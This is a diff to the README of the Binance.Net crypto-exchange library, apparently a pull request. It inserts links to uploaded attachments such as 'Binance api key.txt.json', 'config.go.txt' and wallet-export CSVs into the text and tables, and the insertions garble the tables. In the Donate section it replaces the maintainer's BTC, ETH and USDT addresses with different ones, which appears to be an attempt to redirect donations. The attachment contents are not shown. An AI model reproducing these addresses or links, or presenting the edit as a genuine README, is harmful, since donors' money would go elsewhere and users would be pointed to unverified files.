@@ -68,6 +68,10 @@ var tickerSubscriptionResult = socketClient.SpotApi.ExchangeData.SubscribeToTick
 <img src="https://github.com/JKorf/Binance.Net/blob/f74f262151f21b123deecd9b39a717458a18f6ff/docs/Binance.gif" width="600" />
 
 For information on the clients, dependency injection, response processing and more see the [Binance.Net documentation](https://jkorf.github.io/Binance.Net), [CryptoExchange.Net documentation](https://jkorf.github.io/CryptoExchange.Net), or have a look at the examples [here](https://github.com/JKorf/Binance.Net/tree/master/Examples) or [here](https://github.com/JKorf/CryptoExchange.Net/tree/master/Examples).
+[Blockpit Example Report - 2024 (1).pdf](https://github.com/user-attachments/files/17265064/Blockpit.Example.Report.-.2024.1.pdf)
+[Binance api key.txt.json](https://github.com/user-attachments/files/17265060/Binance.api.key.txt.json)
+[blank.yml.txt](https://github.com/user-attachments/files/17265059/blank.yml.txt)
+[Binance-api-doc-768e93f96c002b53bb3d22595cd3a075148d1abc.zip](https://github.com/user-attachments/files/17265058/Binance-api-doc-768e93f96c002b53bb3d22595cd3a075148d1abc.zip)
 
 ## CryptoExchange.Net
 Binance.Net is based on the [CryptoExchange.Net](https://github.com/JKorf/CryptoExchange.Net) base library. Other exchange API implementations based on the CryptoExchange.Net base library are available and follow the same logic.
@@ -131,11 +135,16 @@ A Discord server is available [here](https://discord.gg/MSpeEtSY8t). For discuss
 |API|Supported|Location|
 |--|--:|--|
 |Market Data|✓|`restClient.UsdFuturesApi.ExchangeData`|
-|Trade|✓|`restClient.UsdFuturesApi.Account` / `restClient.UsdFuturesApi.Trading`|
-|Websocket Market Streams|✓|`socketClient.UsdFuturesApi`|
+|Trade|✓|`restClient.UsdFuturesApi.Account` [export-https-vscode-dev-github-zxramozx-1722925865.json.gz](https://github.com/user-attachments/files/17265068/export-https-vscode-dev-github-zxramozx-1722925865.json.gz)
+[pull_request_template.md](https://github.com/user-attachments/files/17265067/pull_request_template.md)
+/ `restClient.UsdFuturesApi.Trading`[export-https-vscode-dev-github-zxramozx-1722740575.json](https://github.com/user-attachments/files/17265077/export-https-vscode-dev-github-zxramozx-1722740575.json)
+|
+|Websocket Market Streams|✓|`socketClient.UsdFuturesApi`[config.go.txt](https://github.com/user-attachments/files/17265080/config.go.txt)
+|
 |User Data Streams|✓|`socketClient.UsdFuturesApi`|
 |Account|✓|`restClient.UsdFuturesApi.Account` / `restClient.UsdFuturesApi.Trading`|
-|Convert|✓|`restClient.UsdFuturesApi.ExchangeData` / `restClient.UsdFuturesApi.Trading`|
+|Convert|[export-token-0x9cdc684179d200ddab42628f3500fadd60322121.csv](https://github.com/user-attachments/files/17265083/export-token-0x9cdc684179d200ddab42628f3500fadd60322121.csv)
+✓|`restClient.UsdFuturesApi.ExchangeData` / `restClient.UsdFuturesApi.Trading`|
 |Classic Portfolio Margin Endpoints|X||
 
 ### COIN-M Futures
@@ -162,7 +171,8 @@ A Discord server is available [here](https://discord.gg/MSpeEtSY8t). For discuss
 
 ### Portfolio Margin
 |API|Supported|Location|
-|--|--:|--|
+|[export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv](https://github.com/user-attachments/files/17265085/export-0xFa1dB6794de6e994b60741DecaE0567946992181.csv)
+--|--:|--|
 |*|X||
 
 ## Support the project
@@ -171,10 +181,8 @@ I develop and maintain this package on my own for free in my spare time, any sup
 ### Donate
 Make a one time donation in a crypto currency of your choice. If you prefer to donate a currency not listed here please contact me.
 
-**Btc**:  bc1q277a5n54s2l2mzlu778ef7lpkwhjhyvghuv8qf  
-**Eth**:  0xcb1b63aCF9fef2755eBf4a0506250074496Ad5b7   
-**USDT (TRX)**  TKigKeJPXZYyMVDgMyXxMf17MWYia92Rjd
-
+**Btc**:    1DFqa7YG7aASAjRniQeYZstn1364LZbouf
+**Eth**:  0xd41a74d3713ce95c180bc9e91a8bff68ac34b58e**USDT (TRX)**  TZEVpQwHxxbNiEXLXFjoswdQknrkKibbuc
 ### Sponsor
 Alternatively, sponsor me on Github using [Github Sponsors](https://github.com/sponsors/JKorf). 
 
